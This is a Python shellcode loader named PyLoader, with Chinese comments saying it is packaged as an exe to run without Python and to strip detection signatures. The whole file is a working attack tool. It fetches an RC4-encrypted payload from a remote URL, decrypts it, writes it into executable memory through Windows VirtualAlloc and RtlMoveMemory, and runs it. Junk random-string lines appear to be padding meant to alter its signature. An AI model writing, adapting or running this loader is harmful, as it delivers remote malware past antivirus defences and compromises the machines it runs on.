#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Author: Gality; KingSF5
Name：PyLoader.py
Usage: python pyinstaller.py -F -w PyLoader.py
require: requests, pyinstaller
Description: 将py文件打包成exe文件，一方面使得程序可以在无py环境下运行，二是进一步消除特征
E-mail: gality365@gmail.com
"""

import hashlib, base64
import requests
from ctypes import *
import random
'''
config
'''
key = '... YourRC4Key...'
PayloadFileLocation = '...http://........../payload.txt...'


def rc4(text, key):
    key = hashlib.md5(key).hexdigest()
    text = base64.b64decode(text)
    result = ''
    key_len = len(key)
    box = list(range(256))
    j = 0
    for i in range(256):
        j = (j + box[i] + ord(key[i%key_len]))%256
        box[i],box[j] = box[j],box[i]
    i = j = 0
    for element in text:
        i = (i+1)%256
        j = (j+box[i])%256
        box[i],box[j] = box[j],box[i]
        k = chr(element ^ box[(box[i]+box[j])%256])
        result += k
    return result

useless = str(random.random())
r = requests.get(PayloadFileLocation)
code = rc4(r.content, key.encode("utf-8"))
useless += str(random.random())
code = bytearray(base64.b64decode(code))

'''
修复ctypes问题
'''
windll.kernel32.VirtualAlloc.restype = c_void_p
windll.kernel32.RtlCopyMemory.argtypes = (c_void_p, c_void_p, c_size_t)

VirtualAlloc = windll.kernel32.VirtualAlloc
VirtualProtect = windll.kernel32.VirtualProtect
useless += random.choice(useless)
whnd = windll.kernel32.GetConsoleWindow()
RtlMoveMemory = windll.kernel32.RtlMoveMemory
memHscode = VirtualAlloc(c_int(0), c_int(len(code)), c_int(0x3000), c_int(0x40))
buf = (c_char * len(code)).from_buffer(code)
useless += random.choice(useless)[:-1]
RtlMoveMemory(c_void_p(memHscode), buf, c_int(len(code)))
runcode = cast(memHscode, CFUNCTYPE(c_void_p))
runcode()